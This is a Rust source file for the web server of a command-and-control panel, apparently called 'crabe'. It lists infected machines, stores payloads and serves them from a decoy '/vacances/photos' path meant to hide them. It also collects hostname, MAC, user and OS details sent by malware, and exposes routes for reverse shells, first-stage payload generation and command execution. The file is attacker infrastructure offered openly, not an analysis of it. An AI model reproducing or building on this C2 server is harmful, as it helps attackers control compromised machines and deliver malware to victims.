use std::collections::HashMap;
use handlebars::Handlebars;
use serde::Deserialize;


use hyper::StatusCode;
use std::path::PathBuf;
use std::fs::File;
use std::io::Write;
use std::fs;
use std::net::UdpSocket;

use axum::{
    extract::{ConnectInfo, Json, Multipart},
    http::{header, HeaderMap},
    extract,
    response::{Html, IntoResponse, Redirect, Response},
    routing::{get, post},
    Router,
};

use std::net::SocketAddr;
use axum::response;
//use tower_http::services::ServeDir;
//use http::header::X_FORWARDED_FOR;


use crate::payload_db::Payload;
use crate::machine_db::MachineInfo;
use crate::machine_db::InfectedMachine;
use crate::db::Database;
use crate::api::*;

//use crate::rev_shell_handler::{get_available_port, listen};

use crate::events::Events;
//use crate::crypto::decrypt_data;


extern crate chrono;

use chrono::prelude::*;




// CSS

static BOOTSTRAP_CSS: &str = include_str!("../../templates/assets/bootstrap/css/bootstrap.min.css");
static STYLES_CSS: &str = include_str!("../../templates/assets/css/styles.min.css");
static FONTAWESOME_CSS: &str = include_str!("../../templates/assets/fonts/fontawesome-all.min.css");


// JS
static BOOTSTRAP_JS: &str = include_str!("../../templates/assets/bootstrap/js/bootstrap.min.js");
static CHART_MIN_JS: &str = include_str!("../../templates/assets/js/chart.min.min.js");
static SCRIPT_MIN_JS: &str = include_str!("../../templates/assets/js/script.min.js");

// Images
static CRABE2_WEBP: &[u8] = include_bytes!("../../templates/assets/img/crabe2.webp");

// Fonts
static XRX: &[u8] = include_bytes!("../../templates/assets/fonts/XRXV3I6Li01BKofINeaBTMnFcQ.woff2");
static FA_SOLID_900_WOFF2: &[u8] = include_bytes!("../../templates/assets/fonts/fa-solid-900.woff2");
static FA_REGULAR_400_WOFF2: &[u8] = include_bytes!("../../templates/assets/fonts/fa-regular-400.woff2");
static FA_REGULAR_400_WOFF: &[u8] = include_bytes!("../../templates/assets/fonts/fa-regular-400.woff");
static FA_SOLID_900_WOFF: &[u8] = include_bytes!("../../templates/assets/fonts/fa-solid-900.woff");
static FA_REGULAR_400_TTF: &[u8] = include_bytes!("../../templates/assets/fonts/fa-regular-400.ttf");
static FA_SOLID_900_TTF: &[u8] = include_bytes!("../../templates/assets/fonts/fa-solid-900.ttf");

static NOT_FOUND: &str = include_str!("../../templates/404.html");

// Screenshot for documentation
static PAYLOAD_UPLOAD: &[u8] = include_bytes!("../../docs-img/add-payload-file.png");
static PAYLOAD_TEXT: &[u8] = include_bytes!("../../docs-img/add-payload-text.png");
static PAYLOAD_EX: &[u8] = include_bytes!("../../docs-img/exemple-payload.png");
static PAYLOAD_VIEW: &[u8] = include_bytes!("../../docs-img/view-payload.png");
static FST_STAGE: &[u8] = include_bytes!("../../docs-img/1st-stage.png");
static MACHINE_EX: &[u8] = include_bytes!("../../docs-img/exemple-machines.png");
static MACHINE_VIEW: &[u8] = include_bytes!("../../docs-img/view-machine.png");
static LOG: &[u8] = include_bytes!("../../docs-img/logs.png");

// log file
static LOG_FILE: &str = include_str!("../../logs/logs.txt");

// Struct only use when adding a new payload 
#[derive(Deserialize)] 
struct NewPayload {
    payload_name: String,
    payload_content: String,
    payload_type: String,
}


// This function is used in order to display static assets (font, js, css, img) on the web interface
// Redirect to 404.html if not found
async fn serve_assets(extract::Path(path): extract::Path<PathBuf>) -> impl IntoResponse {    
    let mut headers = HeaderMap::new();
    //println!("path : {}", path.display()); 

    let (_status, content_type, content) = match path.to_str() {
        Some("bootstrap/css/bootstrap.min.css") => (StatusCode::OK,"text/css", BOOTSTRAP_CSS.as_bytes()),
        Some("fonts/fontawesome-all.min.css") => (StatusCode::OK,"text/css", FONTAWESOME_CSS.as_bytes()),
        Some("css/styles.min.css") => (StatusCode::OK,"text/css", STYLES_CSS.as_bytes()),
        Some("bootstrap/js/bootstrap.min.js") => (StatusCode::OK,"application/javascript", BOOTSTRAP_JS.as_bytes()),
        Some("js/chart.min.min.js") => (StatusCode::OK,"application/javascript", CHART_MIN_JS.as_bytes()),
        Some("js/script.min.js") => (StatusCode::OK,"application/javascript", SCRIPT_MIN_JS.as_bytes()),
        Some("img/crabe2.webp") => (StatusCode::OK,"image/webp", CRABE2_WEBP),
        Some("fonts/XRXV3I6Li01BKofINeaBTMnFcQ.woff2") => (StatusCode::OK,"font/woff2", XRX),
        Some("templates/assets/fonts/fa-solid-900.woff2") => (StatusCode::OK,"font/woff2", FA_SOLID_900_WOFF2),
        Some("templates/assets/fonts/fa-regular-400.woff2") => (StatusCode::OK,"font/woff2", FA_REGULAR_400_WOFF2),
        Some("templates/assets/fonts/fa-regular-400.woff") => (StatusCode::OK,"font/woff", FA_REGULAR_400_WOFF),
        Some("templates/assets/fonts/fa-solid-900.woff") => (StatusCode::OK,"font/woff", FA_SOLID_900_WOFF),
        Some("templates/assets/fonts/fa-regular-400.ttf") => (StatusCode::OK,"font/ttf", FA_REGULAR_400_TTF),
        Some("templates/assets/fonts/fa-solid-900.ttf") => (StatusCode::OK,"font/ttf", FA_SOLID_900_TTF),
        Some("add-payload-file.png") => (StatusCode::OK,"image/png", PAYLOAD_UPLOAD),
        Some("add-payload-text.png") => (StatusCode::OK,"image/png", PAYLOAD_TEXT),
        Some("exemple-payload.png") => (StatusCode::OK,"image/png", PAYLOAD_EX),
        Some("view-payload.png") => (StatusCode::OK,"image/png", PAYLOAD_VIEW),
        Some("logs.txt") => (StatusCode::OK, "text/plain", LOG_FILE.as_bytes()),
        Some("1st-stage.png") => (StatusCode::OK, "image/png", FST_STAGE),
        Some("view-machine.png") => (StatusCode::OK, "image/png", MACHINE_VIEW),
        Some("exemple-machines.png") => (StatusCode::OK, "image/png", MACHINE_EX),
        Some("logs.png") => (StatusCode::OK, "image/png", LOG),
        _ => (StatusCode::OK,"text/plain", NOT_FOUND.as_bytes()),
    };

    headers.insert(header::CONTENT_TYPE, content_type.parse().unwrap());

    (StatusCode::OK, headers, content)
}

// This function is called when a payload saved in /vacances/photos is downloaded
async fn download_payload(extract::Path(payload_name): extract::Path<PathBuf>) -> impl IntoResponse {
    
    // Get the file path
    let payload_path = PathBuf::from("./vacances/photos/").join(payload_name.clone());
    if payload_path.exists() && payload_path.is_file() {
        let ip = get_local_ip();
        // log this payload request as an event
        let _ = Events::new
        (
            7,
            Some(ip),
            None,
            Some(payload_name.display().to_string()),
            None
        ).log_to_file();

        // Read payload content
        let payload_bytes = fs::read(payload_path).expect("Error when reading payload");
        Response::builder()
            .body(axum::body::boxed(axum::body::Full::from(payload_bytes)))
            .unwrap()
    } else {
        response::Html("<h1>File not found</h1>".to_string()).into_response()
    }
}


// This function is called when the user upload a file as a new payload
// it parse the filename, extension and content and if it's utf-8 save to DB
// then redirect to /payload
pub async fn add_payload_file(
    mut multipart: Multipart,
) -> impl IntoResponse {
    let mut filename = String::new();

    while let Ok(Some(field)) = multipart.next_field().await {
        if let Some(field_name) = field.name() {
            // match the field_name to see if it's the filename or the file uploaded
            match field_name {
                "payload_name" => {
                    filename = field.text().await.unwrap_or_default();
                },
                "payload_file" => {
                    // Create the path for the payload under /vacances/photos to hide it
                    let file_path = PathBuf::from("./vacances/photos/").join(&filename);
                    // if the file got an extension the type is the extension or None if no extension
                    let file_extension = file_path.extension()
                        .map(|ext| ext.to_string_lossy().into_owned())
                        .unwrap_or_else(|| "None".to_string());
                    
                    if let Ok(content) = field.bytes().await {
                        if let Ok(mut file) = File::create(&file_path) {
                            if file.write_all(&content).is_ok() {
                                let db = Database::new("crabe.db").unwrap();
                                let _ = match String::from_utf8(content.to_vec()) {
                                    // if the payload content is utf-8 save it to the db
                                    Ok(str) => db.add_new_payload(&filename, &str, &file_extension),
                                    Err(_) => {
                                        eprintln!("Payload not an UTF-8 string");
                                        let _ = db.add_new_payload(&filename, "Payload not an UTF-8 string", &file_extension);
                                        continue;
                                    }
                                };
                            }
                        }
                    }
                },
                _ => {}
            }
        }
    }
    // Redirect to the payload route
    Redirect::to("/payload")
}

// This function is called when the user create a new payload (not file upload)
// redirect to /payload
async fn add_payload(
    extract::Form(new_payload): extract::Form<NewPayload>,) -> 
    impl IntoResponse {

    let db = Database::new("crabe.db").unwrap();

    // add the payload to the db
    let result = db.add_new_payload(&new_payload.payload_name, &new_payload.payload_content, &new_payload.payload_type);


    match result {
        Ok(_) => Redirect::to("/payload"),
        Err(_) => {
            Redirect::to("/payload?error=Failed")
        }
    }
}

// this function is use for the index.html template
pub async fn dashboard() -> Html<String> {
    // Get the template from index.html
    let template_content = std::fs::read_to_string("./templates/index.html").unwrap_or_else(|err| {
        eprintln!("Error reading template: {:?}", err);
        String::from("Error reading template")
    });

    let mut handlebars = Handlebars::new();
    handlebars.register_template_string("index", template_content).unwrap();

    let mut context = HashMap::new();

    let db = Database::new("crabe.db").unwrap();

    // get the count of how many infected machines
    let machine_owned = db.count_machine().unwrap();
    // get the count of how many payloads
    let payload_number = db.count_payload().unwrap();

    let events_number = db.count_events().unwrap();

    // insert values in the template
    context.insert("machine_owned", machine_owned);
    context.insert("payload_number", payload_number);
    context.insert("events", events_number);
    context.insert("reverse_shell", "0".to_string());

    match handlebars.render("index", &context) {
        Ok(rendered) => Html(rendered),
        Err(e) => {
            eprintln!("Error rendering template: {:?}", e);
            Html("Error rendering template".into())
        }
    }
}

// this function is use for the payload.html template
pub async fn payload() -> Html<String> {
        // Get the template from payload.html
    let template_content = std::fs::read_to_string("./templates/payload.html").unwrap_or_else(|err| {
        eprintln!("Error reading template: {:?}", err);
        String::from("Error reading template")
    });

    let mut handlebars = Handlebars::new();
    handlebars.register_template_string("payload", template_content).unwrap();
    
    let mut context: HashMap<&str, Vec<Payload>> = HashMap::new();


    let db = Database::new("crabe.db").unwrap();
    let payloads = db.fetch_all_payloads().unwrap();
   
    // insert values in the template
    context.insert("payloads", payloads);
    match handlebars.render("payload", &context) {
        Ok(rendered) => Html(rendered),
        Err(e) => {
            eprintln!("Error rendering template: {:?}", e);
            Html("Error rendering template".into())
        }
    }
}

// this function is use for the machines.html template
pub async fn machines() -> Html<String> {
        // Get the template from machines.html
    let template_content = std::fs::read_to_string("./templates/machines.html").unwrap_or_else(|err| {
        eprintln!("Error reading template: {:?}", err);
        String::from("Error reading template")
    });

    let mut handlebars = Handlebars::new();
    handlebars.register_template_string("machines", template_content).unwrap();
    
    let mut context: HashMap<&str, Vec<InfectedMachine>> = HashMap::new();


    let db = Database::new("crabe.db").unwrap();
    let machines = db.fetch_all_machine().unwrap();
   
    // insert values in the template
    context.insert("machines", machines);
    match handlebars.render("machines", &context) {
        Ok(rendered) => Html(rendered),
        Err(e) => {
            eprintln!("Error rendering template: {:?}", e);
            Html("Error rendering template".into())
        }
    }
}

// this function is use for the profile.html template
pub async fn profile() -> Html<String> {
    // Get the template from profile.html
    let template_content = std::fs::read_to_string("./templates/profile.html").unwrap_or_else(|err| {
        eprintln!("Error reading template: {:?}", err);
        String::from("Error reading template")
    });

    let mut handlebars = Handlebars::new();
    handlebars.register_template_string("profile", template_content).unwrap();
    let context: HashMap<&str, &str> = HashMap::new();

    match handlebars.render("profile", &context) {
        Ok(rendered) => Html(rendered),
        Err(e) => {
            eprintln!("Error rendering template: {:?}", e);
            Html("Error rendering template".into())
        }
    }
}

// this function is use for the task-event.html template
pub async fn task_event() -> Html<String> {
    // Get the template from task-event.html
    let template_content = std::fs::read_to_string("./templates/task-event.html").unwrap_or_else(|err| {
        eprintln!("Error reading template: {:?}", err);
        String::from("Error reading template")
    });

    let mut handlebars = Handlebars::new();
    handlebars.register_template_string("task_event", template_content).unwrap();
    
    // insert values in the template
    
    let mut context: HashMap<&str, Vec<Events>> = HashMap::new();

    let db = Database::new("crabe.db").unwrap();
    let events = db.fetch_all_events().unwrap();
    

    // insert values in the template
    context.insert("events", events);

    match handlebars.render("task_event", &context) {
        Ok(rendered) => Html(rendered),
        Err(e) => {
            eprintln!("Error rendering template: {:?}", e);
            Html("Error rendering template".into())
        }
    }
}

// this function is use for the login.html template
pub async fn login() -> Html<String> {
    // Get the template from login.html
    let template_content = std::fs::read_to_string("./templates/login.html").unwrap_or_else(|err| {
        eprintln!("Error reading template: {:?}", err);
        String::from("Error reading template")
    });

    let mut handlebars = Handlebars::new();
    handlebars.register_template_string("login", template_content).unwrap();
    let context: HashMap<&str, &str> = HashMap::new();

    match handlebars.render("login", &context) {
        Ok(rendered) => Html(rendered),
        Err(e) => {
            eprintln!("Error rendering template: {:?}", e);
            Html("Error rendering template".into())
        }
    }
}

// this function is use for the register.html template
pub async fn register() -> Html<String> {
    // Get the template from register.html
    let template_content = std::fs::read_to_string("./templates/register.html").unwrap_or_else(|err| {
        eprintln!("Error reading template: {:?}", err);
        String::from("Error reading template")
    });

    let mut handlebars = Handlebars::new();
    handlebars.register_template_string("register", template_content).unwrap();
    let context: HashMap<&str, &str> = HashMap::new();

    match handlebars.render("register", &context) {
        Ok(rendered) => Html(rendered),
        Err(e) => {
            eprintln!("Error rendering template: {:?}", e);
            Html("Error rendering template".into())
        }
    }
}

// this function is use for the 404.html template
pub async fn handle_404() -> impl IntoResponse {
    // Get the template from 404.html
    let template_content = std::fs::read_to_string("./templates/404.html").unwrap_or_else(|err| {
        eprintln!("Error reading template: {:?}", err);
        String::from("Error reading template")
    });

    let mut handlebars = Handlebars::new();
    handlebars.register_template_string("404", template_content).unwrap();
    let context: HashMap<&str, &str> = HashMap::new();

    match handlebars.render("404", &context) {
        Ok(rendered) => Html(rendered),
        Err(e) => {
            eprintln!("Error rendering template: {:?}", e);
            Html("Error rendering template".into())
        }
    }

}

pub async fn documentation() -> impl IntoResponse {

    let template_content = std::fs::read_to_string("./templates/docs.html").unwrap_or_else(|err| {
        eprintln!("Error reading template: {:?}", err);
        String::from("Error reading template")
    });

    let mut handlebars = Handlebars::new();
    handlebars.register_template_string("docs", template_content).unwrap();
    let context: HashMap<&str, &str> = HashMap::new();

    match handlebars.render("docs", &context) {
        Ok(rendered) => Html(rendered),
        Err(e) => {
            eprintln!("Error rendering template: {:?}", e);
            Html("Error rendering template".into())
        }
    }

}

pub async fn shell_page() -> impl IntoResponse {

    let template_content = std::fs::read_to_string("./templates/shell.html").unwrap_or_else(|err| {
        eprintln!("Error reading template: {:?}", err);
        String::from("Error reading template")
    });

    let mut handlebars = Handlebars::new();
    handlebars.register_template_string("shell", template_content).unwrap();
    let context: HashMap<&str, &str> = HashMap::new();

    match handlebars.render("shell", &context) {
        Ok(rendered) => Html(rendered),
        Err(e) => {
            eprintln!("Error rendering template: {:?}", e);
            Html("Error rendering template".into())
        }
    }

}

pub async fn first_stage() -> impl IntoResponse{
    let template_content = std::fs::read_to_string("./templates/init.html").unwrap_or_else(|err| {
        eprintln!("Error reading template: {:?}", err);
        String::from("Error reading template")
    });

    let mut handlebars = Handlebars::new();
    handlebars.register_template_string("init", template_content).unwrap();
    let context: HashMap<&str, &str> = HashMap::new();

    match handlebars.render("init", &context) {
        Ok(rendered) => Html(rendered),
        Err(e) => {
            eprintln!("Error rendering template: {:?}", e);
            Html("Error rendering template".into())
        }
    }
}






// function where the malware could sent information about the infected machine and then store information
// in the database
pub async fn get_info( ConnectInfo(addr): ConnectInfo<std::net::SocketAddr>, _headers: HeaderMap, request: Json<MachineInfo>) -> impl IntoResponse {
    let db = Database::new("crabe.db").unwrap();
    let info = request;

    let ip = addr.ip().to_string();

    let _ = db.add_new_machine(&info.hostname, &ip, &info.mac, &info.users, &info.os, &info.os_version);
    //let dec_data = match decrypt_data(enc_data) {
    //    Ok(data) => data,
    //    Err(e) => {
    //        eprintln!("Decryption error: {:?}", e);
    //        return HttpResponse::InternalServerError().finish();
    //    }
    //};

    Redirect::to("/index.html")
}

// function just for ping to test if the C2 is up
async fn ping() -> String {
    let now = Utc::now();
    let formatted_time = now.format("%d-%m-%Y %H:%M").to_string();
    format!("pong with the date: {}", formatted_time)
}

pub async fn shell_cmd(command: Json<Command>) 
{
    println!("Recevied command : {}", command.cmd);

}


fn get_local_ip() -> String {

    let socket = match UdpSocket::bind("0.0.0.0:0") 
    {
        Ok(s) => s,
        Err(_) => panic!("Error binding socket"),
    };


    if let Err(_) = socket.connect("8.8.8.8:80") 
    {
        panic!("Error connecting to google");
    }

    let local_addr = match socket.local_addr() 
    {
        Ok(addr) => addr,
        Err(_) => panic!("Error getting local ip"),
    };

    local_addr.ip().to_string()
}

pub async fn run() 
{

    // Create routes
    let app = Router::new()
            .route("/", get(dashboard))
        .route("/ping", get(ping))
        .route("/payload", get(payload))
        .route("/machines", get(machines))
        .route("/profile", get(profile))
        .route("/task-event", get(task_event))
        .route("/login", get(login))
        .route("/register", get(register))
        .route("/shell", get(shell_page))
        .route("/assets/*path", get(serve_assets))
        .route("/docs-img/*path", get(serve_assets))
        .route("/add-payload", post(add_payload))
        .route("/get-info", post(get_info))
        .route("/add-payload-file", post(add_payload_file))
        .route("/vacances/photos/:payload_name", get(download_payload))
        .route("/docs", get(documentation))
        .route("/init", get(first_stage))
        .route("/logs/*log" , get(serve_assets))

        .route("/api/shell/list_shell", get(list_shell))
        .route("/api/sumos", get(count_by_os))
        .route("/api/shell/:shell_name", get(get_shell))
        .route("/api/payload/:id", get(fetch_payload_by_id))
        .route("/api/payload/delete/:id", get(delete_payload_by_id))
        .route("/api/payload/list_payload", get(list_payload))
        .route("/api/machine/:id", get(fetch_machine_by_id))
        .route("/api/open-port", get(get_open_port))
        .route("/api/execute_command", post(shell_cmd))
        .route("/api/payload/create/:bin_name/:os", get(create_first_stage))
        .fallback(get(handle_404))
        .into_make_service_with_connect_info::<SocketAddr>();

    let addr = "0.0.0.0:3000".parse().unwrap();
    let ip = get_local_ip();
    // Event: start C2
    let _ = Events::new
        (
            19,
            Some(ip),
            None,
            None,
            None,
        ).log_to_file();
    // Start the app
    axum::Server::bind(&addr)
        .serve(app)
        .await
        .unwrap();

}

